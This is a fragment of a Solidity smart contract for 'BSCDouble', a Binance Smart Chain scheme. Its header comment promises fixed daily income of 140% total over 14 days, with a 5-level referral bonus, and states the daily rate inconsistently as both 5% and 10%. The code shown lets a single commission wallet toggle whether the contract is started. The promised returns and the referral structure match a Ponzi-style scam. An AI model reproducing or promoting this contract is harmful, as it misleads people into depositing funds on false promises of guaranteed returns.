...
/*   BSCDouble - is the new yield farm on Binance Smart Chain with a fixed and steady daily income of 5%!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bSCdoubler.online                                      │
 *   │                                        │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 ...
 *   - Total income: 10% daily, 14 days (140% total rewards)
 *   - Earnings every second, withdraw any time
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5-level referral reward: 8% - 3% - 2% - 1.5% - 0.5%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 80%: platform main balance, using for participants payouts, affiliate program bonuses
 *   - 20%: advertising and promotion expenses, support work, technical functioning, administration fee
 *
 *  
 */
...
contract BSCDouble {
    ...
    modifier UNN() {
      require(msg.sender == commissionWallet, "Ownable: caller is not the owner");
      _;
    }

	function startedStatus(bool _status) public UNN {
        started = _status;
    }
